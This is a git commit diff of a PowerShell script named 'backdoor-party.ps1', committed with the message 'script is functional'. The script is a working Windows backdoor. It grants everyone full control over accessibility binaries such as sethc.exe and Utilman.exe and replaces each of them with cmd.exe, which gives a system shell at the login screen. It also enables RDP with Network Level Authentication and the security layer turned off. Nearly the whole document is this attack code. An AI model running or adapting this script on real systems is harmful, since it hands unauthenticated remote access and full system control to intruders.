c7177930e745d5c84a1fbb1738a62f39a06eb103
landyy <rmb2555@rit.edu>
2018-03-24 11:52:27 -0400

    script is functional

--- backdoor-party.ps1
+++ backdoor-party.ps1
@@ -1,21 +1,25 @@
 ﻿#Put binaries you want backdoored here
 $bin = @("osk.exe","sethc.exe","Narrator.exe","Magnify.exe","Utilman.exe")
 
+#go through each binary and then perform permission actions, move them, and then move cmd in their place
 foreach ($element in $bin){
 
     Write-Host "[*] Backdooring $element" -ForegroundColor Green
 
     $Acl = Get-Acl "C:\Windows\System32\$element"
-    $Ar = New-Object  system.security.accesscontrol.filesystemaccessrule($env:USERNAME,"FullControl","Allow")
-    $Acl.SetAccessRule($Ar)
-    Set-Acl "C:\Windows\System32\osk.exe" $Acl
-    Rename-Item -Path "C:\Window\System32\$element" -NewName "C:\Windows\System32\old$element"
+    $Ar = New-Object System.Security.AccessControl.FileSystemAccessRule("everyone","full","noneifc","none","Allow")
+    $Group = New-Object System.Security.Principal.NTAccount("Administrator")
+    $Acl.SetOwner($Group)
+    $Acl.AddAccessRule($Ar)
+    Set-Acl -Path "C:\Windows\System32\$element" -AclObject $Acl
+    Rename-Item -Path "C:\Windows\System32\$element" -NewName "C:\Windows\System32\old$element"
     Copy-Item "C:\Windows\System32\cmd.exe" -Destination "C:\Windows\System32\$element"
 
 }
 
-Write-Host "[*] Setting Up RDP $element" -ForegroundColor Green
+Write-Host "[*] Setting Up RDP" -ForegroundColor Green
 
-New-ItemProperty -Path "HKLM:\SYSTEM\CurrentControlSet\Control\Terminal Server\WinStations\RDP-Tcp" -PropertyType DWORD -Name UserAuthentication
-Set-ItemProperty -Path "HKLM:\SYSTEM\CurrentControlSet\Control\Terminal Server\WinStations\RDP-Tcp" -PropertyType DWORD -Name UserAuthentication
-Set-ItemProperty -Path "HKLM:\System\CurrentControlSet\Control\Terminal Server" -Name "fDenyTSConnections" –Value
+#make userauth allowed
+Set-ItemProperty -Path "HKLM:\SYSTEM\CurrentControlSet\Control\Terminal Server\WinStations\RDP-Tcp" -Name UserAuthentication -Value 0
+Set-ItemProperty -Path "HKLM:\System\CurrentControlSet\Control\Terminal Server" -Name "fDenyTSConnections" –Value 0
+Set-ItemProperty -Path "HKLM:\SYSTEM\CurrentControlSet\Control\Terminal Server\WinStations\RDP-Tcp" -Name SecurityLayer -Value 0
